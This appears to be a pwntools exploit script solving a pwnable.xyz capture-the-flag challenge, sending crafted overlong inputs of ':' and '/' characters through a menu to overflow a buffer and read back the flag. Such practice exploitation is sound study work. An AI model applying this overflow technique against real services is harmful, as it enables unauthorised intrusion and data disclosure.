from pwn import *

# x/20gx 0x555555756200 
# context.log_level = "debug"
# p = process('./challenge')
# gdb.attach(p, '''b *0x555555554d64
# 	b *0x555555554dcc
# 	b *0x555555554db5''')

p = remote('svc.pwnable.xyz', 30021)

p.sendlineafter('>', '2')
p.sendafter(':', 'https:///')
p.sendlineafter(':', str(0x7f))
p.send(':'*0x7f)

p.sendlineafter('>', '2')
p.sendafter(':', 'https:///')
p.sendlineafter(':', str(0x7f))
p.send('/'*0x7f)

p.sendlineafter('>', '2')
p.sendafter(':', 'https:///')
p.sendlineafter(':', str(0x7f))
p.send('/'*0x7f)

p.sendlineafter('>', '4')
p.recvline()
p.recvline()
p.recvuntil('}')